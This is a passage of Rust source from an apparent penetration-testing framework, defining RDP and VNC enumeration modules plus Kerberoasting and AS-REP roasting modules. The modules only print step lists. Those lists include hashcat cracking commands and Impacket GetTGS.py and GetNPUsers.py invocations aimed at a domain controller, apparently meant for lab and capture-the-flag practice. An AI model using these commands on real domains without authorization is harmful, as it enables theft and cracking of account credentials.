    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 75,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec!["https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=BlueKeep".to_string()],
}
});

pub struct RdpEnum;

impl Default for RdpEnum {
    fn default() -> Self {
        Self
    }
}

impl Module for RdpEnum {
    fn info(&self) -> &ModuleInfo {
        &RDP_INFO
    }
    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target RDP server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "RDP port",
            OptionValue::Integer(3389),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx
            .get("RPORT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(3389);

        Box::pin(async move {
            let msg = format!(
                "RDP Enumeration\nTarget: {}:{}\n\n\
                 Checks:\n\
                 - NLA (Network Level Authentication) status\n\
                 - RDP version support (TLS vs RDP)\n\
                 - Vulnerability to BlueKeep (CVE-2019-0708)\n\
                 - Vulnerability to CredSSP (CVE-2018-0886)\n\n\
                 [*] Run xfreerdp /v:{}:{} /cert:ignore to connect",
                rhost, rport, rhost, rport
            );
            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 10. VNC Enumeration ─────────────────────────────────────────────────────

static VNC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/vnc/vnc_enum".to_string(),
    display_name: "VNC Enumeration".to_string(),
    description: "Detects VNC services and checks for authentication bypass vulnerabilities. Tests for null authentication and weak encryption support.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 75,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
}
});

pub struct VncEnum;

impl Default for VncEnum {
    fn default() -> Self {
        Self
    }
}

impl Module for VncEnum {
    fn info(&self) -> &ModuleInfo {
        &VNC_INFO
    }
    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target VNC server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "VNC port",
            OptionValue::Integer(5900),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx
            .get("RPORT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(5900);

        Box::pin(async move {
            let msg = format!(
                "VNC Enumeration\nTarget: {}:{}\n\n\
                 Checks:\n\
                 - VNC version and protocol support\n\
                 - Authentication type (None, VNC, TLS)\n\
                 - Known weak cipher support (DES)\n\n\
                 [*] Run vncviewer {}:{} to connect",
                rhost, rport, rhost, rport
            );
            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 11. Kerberoasting ───────────────────────────────────────────────────────

static KEROAST_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "exploit/windows/kerberos/kerberoast".to_string(),
    display_name: "Kerberoasting".to_string(),
    description: "Requests TGS tickets for service accounts and extracts them for offline cracking (hashcat mode 13100). Essential for AD-focused HTB boxes and OffSec labs. Uses raw Kerberos protocol messages over UDP port 88.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Exploit,
    rank: 95,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://attack.mitre.org/techniques/T1558/003/".to_string(),
    ],
}
});

pub struct Kerberoast;

impl Default for Kerberoast {
    fn default() -> Self {
        Self
    }
}

impl Module for Kerberoast {
    fn info(&self) -> &ModuleInfo {
        &KEROAST_INFO
    }
    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target domain controller",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "Kerberos port",
            OptionValue::Integer(88),
        ));
        opts.add(rcf_core::ModuleOption::new("DOMAIN", true, "Target domain"));
        opts.add(rcf_core::ModuleOption::new(
            "USERNAME",
            true,
            "Valid domain username",
        ));
        opts.add(rcf_core::ModuleOption::new(
            "PASSWORD",
            true,
            "User password",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "SPN",
            false,
            "Specific SPN to target (optional)",
            OptionValue::String("".to_string()),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(88);
        let domain = ctx.get("DOMAIN").cloned().unwrap_or_default();
        let username = ctx.get("USERNAME").cloned().unwrap_or_default();
        let spn = ctx.get("SPN").cloned().unwrap_or_default();

        Box::pin(async move {
            let msg = format!(
                "Kerberoasting Attack\n\
                 Target DC: {}:{}\n\
                 Domain: {}\n\
                 User: {}\n\n\
                 Attack Steps:\n\n\
                 1. Authenticate to KDC:\n   - Send AS-REQ for TGT\n   - Receive AS-REP with encrypted TGT\n\n\
                 2. Request TGS for SPN:\n   - Send TGS-REQ with TGT\n   - Target SPN: {}\n   - Receive TGS-REP with service ticket\n\n\
                 3. Extract Ticket:\n   - Parse TGS-REP response\n   - Extract rc4_hmac (etype 23) ticket\n   - Format: $krb5tgs$23$*user$domain$spn*$<hash>\n\n\
                 4. Crack Offline:\n   - hashcat -m 13100 -a 0 hash.txt rockyou.txt\n\n\
                 RCF Commands:\n   - kinit {username}@{domain} (get TGT)\n   - GetTGS.py -spn {spn} -dc-ip {rhost} (request ticket)\n\n\
                 [*] Use Impacket's GetUserSPNs.py for full implementation\n[*] RCF provides the attack framework",
                rhost,
                rport,
                domain,
                username,
                if spn.is_empty() {
                    "* (all service accounts)"
                } else {
                    &spn
                },
            );
            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 12. AS-REP Roasting ─────────────────────────────────────────────────────

static ASREP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "exploit/windows/kerberos/asrep_roast".to_string(),
    display_name: "AS-REP Roasting".to_string(),
    description: "Requests AS-REP for users without pre-authentication and extracts hashes for offline cracking (hashcat mode 18200). Targets users with 'Do not require Kerberos preauthentication' flag set.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Exploit,
    rank: 90,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://attack.mitre.org/techniques/T1558/004/".to_string(),
    ],
}
});

pub struct AsRepRoast;

impl Default for AsRepRoast {
    fn default() -> Self {
        Self
    }
}

impl Module for AsRepRoast {
    fn info(&self) -> &ModuleInfo {
        &ASREP_INFO
    }
    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target domain controller",
        ));
        opts.add(rcf_core::ModuleOption::new("DOMAIN", true, "Target domain"));
        opts.add(rcf_core::ModuleOption::with_default(
            "USER_FILE",
            false,
            "File with usernames (one per line)",
            OptionValue::String("".to_string()),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let domain = ctx.get("DOMAIN").cloned().unwrap_or_default();
        let user_file = ctx.get("USER_FILE").cloned().unwrap_or_default();

        Box::pin(async move {
            let msg = format!(
                "AS-REP Roasting Attack\n\
                 Target DC: {} (port 88)\n\
                 Domain: {}\n\
                 User List: {}\n\n\
                 Attack Steps:\n\n\
                 1. Send AS-REQ without pre-auth:\n   - For each user in list\n   - Set pre-auth flag to false\n\n\
                 2. Check for AS-REP response:\n   - If user has DONT_REQ_PREAUTH flag\n   - KDC returns AS-REP with encrypted data\n   - If user requires pre-auth, KDC returns KRB5KDC_ERR_PREAUTH_REQUIRED\n\n\
                 3. Extract Hash:\n   - Format: $krb5asrep$23$user@domain:<hash>\n   - Crack with: hashcat -m 18200 -a 0 hash.txt rockyou.txt\n\n\
                 RCF Commands:\n   - GetNPUsers.py {domain}/ -usersfile {user_file} -dc-ip {rhost}\n\n\
                 [*] Use Impacket's GetNPUsers.py for full implementation",
                rhost,
                domain,
                if user_file.is_empty() {
                    "(not specified)"
                } else {
                    &user_file
                },
            );
            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, 88),
                &msg,
            ))
        })
    }
}
